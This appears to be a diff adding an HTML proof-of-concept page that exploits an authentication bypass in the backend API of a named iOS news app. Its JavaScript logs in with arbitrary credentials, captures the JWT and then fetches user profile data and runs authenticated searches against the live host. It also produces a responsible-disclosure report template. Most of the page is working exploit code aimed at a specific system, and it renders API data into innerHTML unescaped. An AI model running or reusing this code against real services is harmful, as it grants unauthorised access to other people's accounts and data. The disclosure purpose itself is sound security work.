@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A01 API Security PoC</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a; 
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 900px; margin: 0 auto; }
+        h1 { 
+            color: #ff4444; 
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .warning-badge {
+            background: #ff4444;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .subtitle { color: #888; margin-bottom: 30px; }
+        
+        .card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .card h2 { 
+            color: #fff; 
+            font-size: 16px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .card h2 .step {
+            background: #333;
+            color: #888;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+        .card h2 .step.active { background: #ff4444; color: white; }
+        .card h2 .step.done { background: #44ff44; color: black; }
+        
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; color: #888; font-size: 12px; margin-bottom: 5px; }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+        }
+        .input-group input:focus { outline: none; border-color: #ff4444; }
+        
+        button {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        button:hover { background: #ff6666; }
+        button:disabled { background: #333; color: #666; cursor: not-allowed; }
+        button.secondary { background: #333; }
+        button.secondary:hover { background: #444; }
+        
+        .status {
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+        .status.success { background: rgba(68, 255, 68, 0.1); border: 1px solid #44ff44; color: #44ff44; }
+        .status.error { background: rgba(255, 68, 68, 0.1); border: 1px solid #ff4444; color: #ff4444; }
+        .status.info { background: rgba(68, 136, 255, 0.1); border: 1px solid #4488ff; color: #4488ff; }
+        
+        .token-display {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 11px;
+            word-break: break-all;
+            max-height: 80px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+        
+        .user-info {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .user-info-item {
+            background: #0a0a0a;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .user-info-item label { color: #666; font-size: 11px; display: block; }
+        .user-info-item span { color: #fff; font-size: 13px; }
+        
+        .search-box {
+            display: flex;
+            gap: 10px;
+        }
+        .search-box input { flex: 1; }
+        
+        .articles { margin-top: 20px; }
+        .article {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            gap: 15px;
+        }
+        .article-image {
+            flex-shrink: 0;
+            width: 120px;
+            height: 90px;
+            border-radius: 6px;
+            overflow: hidden;
+            background: #1a1a1a;
+        }
+        .article-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .article-image.no-image {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444;
+            font-size: 24px;
+        }
+        .article-content {
+            flex: 1;
+            min-width: 0;
+        }
+        .article-title { 
+            color: #fff; 
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        .article-meta span { display: flex; align-items: center; gap: 4px; }
+        .article-summary { color: #aaa; font-size: 13px; line-height: 1.5; }
+        .article-link { 
+            display: inline-block;
+            margin-top: 10px;
+            color: #4488ff;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .article-link:hover { text-decoration: underline; }
+        
+        .vuln-list {
+            list-style: none;
+            margin-top: 15px;
+        }
+        .vuln-list li {
+            padding: 10px 15px;
+            background: rgba(255, 68, 68, 0.1);
+            border-left: 3px solid #ff4444;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+        .vuln-list li.critical { border-color: #ff4444; }
+        .vuln-list li.high { border-color: #ff8844; background: rgba(255, 136, 68, 0.1); }
+        .vuln-list li.medium { border-color: #ffcc44; background: rgba(255, 204, 68, 0.1); }
+        
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            🔓 A01 API Security PoC
+            <span class="warning-badge">VULNERABILITY DEMO</span>
+        </h1>
+        <p class="subtitle">Proof of Concept demonstrating authentication bypass on backend-cap10.research-model-y.xyz</p>
+        
+        <!-- Vulnerabilities Summary -->
+        <div class="card">
+            <h2>🚨 Identified Vulnerabilities</h2>
+            <ul class="vuln-list">
+                <li class="critical"><strong>CRITICAL:</strong> Authentication bypass - /login accepts ANY credentials</li>
+                <li class="high"><strong>HIGH:</strong> Full API schema exposed at /docs, /redoc, /openapi.json</li>
+                <li class="medium"><strong>MEDIUM:</strong> Server version disclosure (uvicorn)</li>
+            </ul>
+        </div>
+        
+        <!-- Step 1: Login -->
+        <div class="card" id="step1">
+            <h2><span class="step active">1</span> Authentication Bypass Demo</h2>
+            <p style="color: #888; font-size: 13px; margin-bottom: 15px;">
+                Enter ANY email and password. The API will accept it and return valid JWT tokens.
+            </p>
+            <div class="input-group">
+                <label>Email (any value works)</label>
+                <input type="email" id="email" value="fake@doesnotexist.com" placeholder="literally@anything.com">
+            </div>
+            <div class="input-group">
+                <label>Password (any value works)</label>
+                <input type="password" id="password" value="this-password-is-not-checked" placeholder="any string">
+            </div>
+            <button onclick="login()">🔓 Bypass Authentication</button>
+            <div id="loginStatus" class="hidden"></div>
+            <div id="tokenDisplay" class="token-display hidden"></div>
+        </div>
+        
+        <!-- Step 2: User Info -->
+        <div class="card hidden" id="step2">
+            <h2><span class="step">2</span> Access User Data</h2>
+            <p style="color: #888; font-size: 13px; margin-bottom: 15px;">
+                With the obtained token, we can access the /users/me endpoint.
+            </p>
+            <button onclick="getUserInfo()">📋 Fetch User Profile</button>
+            <div id="userStatus" class="hidden"></div>
+            <div id="userInfo" class="user-info hidden"></div>
+        </div>
+        
+        <!-- Step 3: Search Articles -->
+        <div class="card hidden" id="step3">
+            <h2><span class="step">3</span> Search Articles (Full API Access)</h2>
+            <p style="color: #888; font-size: 13px; margin-bottom: 15px;">
+                We can use the embeddings API and search articles - full functionality.
+            </p>
+            <div class="search-box">
+                <input type="text" id="searchQuery" placeholder="Search for anything... (e.g., Tesla, AI, crypto)">
+                <button onclick="searchArticles()">🔍 Search</button>
+            </div>
+            <div id="searchStatus" class="hidden"></div>
+            <div id="articles" class="articles"></div>
+        </div>
+        
+        <!-- Report Template -->
+        <div class="card hidden" id="reportCard">
+            <h2>📝 Responsible Disclosure Report</h2>
+            <p style="color: #888; font-size: 13px; margin-bottom: 15px;">
+                Copy this template for your vulnerability report:
+            </p>
+            <button onclick="generateReport()">Generate Report</button>
+            <div id="reportOutput" class="hidden" style="margin-top: 15px;">
+                <textarea id="reportText" style="width: 100%; height: 200px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; color: #fff; padding: 12px; font-family: monospace; font-size: 12px;"></textarea>
+                <button class="secondary" style="margin-top: 10px;" onclick="copyReport()">📋 Copy to Clipboard</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const API_BASE = 'https://backend-cap10.research-model-y.xyz';
+        let accessToken = null;
+        let userEmail = null;
+        
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const statusEl = document.getElementById('loginStatus');
+            statusEl.className = 'status info';
+            statusEl.textContent = 'Attempting login with arbitrary credentials...';
+            statusEl.classList.remove('hidden');
+            
+            try {
+                const response = await fetch(`${API_BASE}/authentication/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                const data = await response.json();
+                
+                if (data.access_token) {
+                    accessToken = data.access_token;
+                    userEmail = email;
+                    
+                    statusEl.className = 'status success';
+                    statusEl.innerHTML = `✅ <strong>VULNERABILITY CONFIRMED!</strong> Login accepted without password verification.`;
+                    
+                    document.getElementById('tokenDisplay').textContent = `Access Token: ${accessToken.substring(0, 50)}...`;
+                    document.getElementById('tokenDisplay').classList.remove('hidden');
+                    
+                    // Update step indicators
+                    document.querySelector('#step1 .step').className = 'step done';
+                    document.getElementById('step2').classList.remove('hidden');
+                    document.querySelector('#step2 .step').className = 'step active';
+                } else {
+                    throw new Error('No token received');
+                }
+            } catch (error) {
+                statusEl.className = 'status error';
+                statusEl.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function getUserInfo() {
+            const statusEl = document.getElementById('userStatus');
+            statusEl.className = 'status info';
+            statusEl.textContent = 'Fetching user profile...';
+            statusEl.classList.remove('hidden');
+            
+            try {
+                const response = await fetch(`${API_BASE}/users/me`, {
+                    headers: { 'Authorization': `Bearer ${accessToken}` }
+                });
+                
+                const data = await response.json();
+                
+                statusEl.className = 'status success';
+                statusEl.textContent = '✅ User data retrieved successfully';
+                
+                const userInfoEl = document.getElementById('userInfo');
+                userInfoEl.innerHTML = `
+                    <div class="user-info-item"><label>User ID</label><span>${data.id}</span></div>
+                    <div class="user-info-item"><label>Email</label><span>${data.email}</span></div>
+                    <div class="user-info-item"><label>Created</label><span>${new Date(data.created_at).toLocaleString()}</span></div>
+                    <div class="user-info-item"><label>Tags</label><span>${data.profile?.custom_tags_v2?.length || 0} configured</span></div>
+                `;
+                userInfoEl.classList.remove('hidden');
+                
+                // Update steps
+                document.querySelector('#step2 .step').className = 'step done';
+                document.getElementById('step3').classList.remove('hidden');
+                document.querySelector('#step3 .step').className = 'step active';
+                document.getElementById('reportCard').classList.remove('hidden');
+            } catch (error) {
+                statusEl.className = 'status error';
+                statusEl.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function searchArticles() {
+            const query = document.getElementById('searchQuery').value;
+            if (!query) return;
+            
+            const statusEl = document.getElementById('searchStatus');
+            statusEl.className = 'status info';
+            statusEl.textContent = 'Creating embedding and searching...';
+            statusEl.classList.remove('hidden');
+            
+            try {
+                // Get embedding
+                const embedResponse = await fetch(`${API_BASE}/embeddings/`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ query })
+                });
+                const embedData = await embedResponse.json();
+                
+                // Search articles
+                const searchResponse = await fetch(`${API_BASE}/articles/search`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        query,
+                        embedding: embedData.embedding,
+                        page_size: 5
+                    })
+                });
+                const searchData = await searchResponse.json();
+                
+                statusEl.className = 'status success';
+                statusEl.textContent = `✅ Found ${searchData.articles?.length || 0} articles`;
+                
+                const articlesEl = document.getElementById('articles');
+                articlesEl.innerHTML = (searchData.articles || []).map(article => {
+                    // Find thumbnail or image from embeds
+                    const embeds = article.embeds || [];
+                    const thumbnail = embeds.find(e => e.type === 'thumbnail') || embeds.find(e => e.type === 'image');
+                    const imageHtml = thumbnail 
+                        ? `<div class="article-image"><img src="${thumbnail.url}" alt="" onerror="this.parentElement.innerHTML='📰'; this.parentElement.classList.add('no-image');"></div>`
+                        : `<div class="article-image no-image">📰</div>`;
+                    
+                    return `
+                    <div class="article">
+                        ${imageHtml}
+                        <div class="article-content">
+                            <div class="article-title">${article.ai_title || 'Untitled'}</div>
+                            <div class="article-meta">
+                                <span>📍 ${article.medium}</span>
+                                <span>👤 ${article.author || 'Unknown'}</span>
+                                <span>❤️ ${article.likes || 0}</span>
+                                <span>🔄 ${article.reposts || 0}</span>
+                            </div>
+                            <div class="article-summary">${article.ai_summary || ''}</div>
+                            <a href="${article.url}" target="_blank" class="article-link">View original →</a>
+                        </div>
+                    </div>
+                `}).join('');
+                
+                document.querySelector('#step3 .step').className = 'step done';
+            } catch (error) {
+                statusEl.className = 'status error';
+                statusEl.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        function generateReport() {
+            const report = `# Security Vulnerability Report - A01 News API
+
+## Summary
+Critical authentication bypass vulnerability discovered in the A01 News API backend.
+
+## Affected System
+- **URL:** https://backend-cap10.research-model-y.xyz
+- **App:** A01: Your Personal News Agent (iOS)
+- **App Store ID:** 6745206011
+
+## Vulnerability Details
+
+### 1. CRITICAL: Authentication Bypass
+**Endpoint:** POST /authentication/login
+**Issue:** The login endpoint accepts ANY email/password combination and returns valid JWT tokens without verifying credentials.
+
+**Steps to Reproduce:**
+1. Send POST request to /authentication/login
+2. Use any email (e.g., "fake@test.com") and any password
+3. Receive valid access_token and refresh_token
+4. Use tokens to access all authenticated endpoints
+
+**Impact:** 
+- Anyone can create accounts with arbitrary emails
+- No password verification occurs
+- Full API access granted to unauthenticated users
+
+### 2. HIGH: API Documentation Exposed
+**Endpoints:** /docs, /redoc, /openapi.json
+**Issue:** Full API schema publicly accessible, revealing all endpoints, parameters, and security requirements.
+
+### 3. MEDIUM: Information Disclosure
+- Server header reveals: uvicorn
+- JWT contains internal key ID: news-api-key-1
+
+## Proof of Concept
+A working web-based PoC has been created demonstrating:
+- Authentication bypass
+- User profile access
+- Article search functionality
+
+## Recommendations
+1. Implement proper password verification in login endpoint
+2. Add rate limiting to authentication endpoints
+3. Restrict access to /docs, /redoc, /openapi.json in production
+4. Remove server version headers
+5. Consider adding CAPTCHA or similar anti-automation measures
+
+## Timeline
+- **Discovered:** ${new Date().toISOString().split('T')[0]}
+- **Reported:** [DATE]
+- **Response:** [PENDING]
+
+## Contact
+[Your contact information]
+
+---
+This report is provided in good faith as part of responsible disclosure.`;
+            
+            document.getElementById('reportText').value = report;
+            document.getElementById('reportOutput').classList.remove('hidden');
+        }
+        
+        function copyReport() {
+            const reportText = document.getElementById('reportText');
+            reportText.select();
+            document.execCommand('copy');
+            alert('Report copied to clipboard!');
+        }
+    </script>
+</body>
+</html>
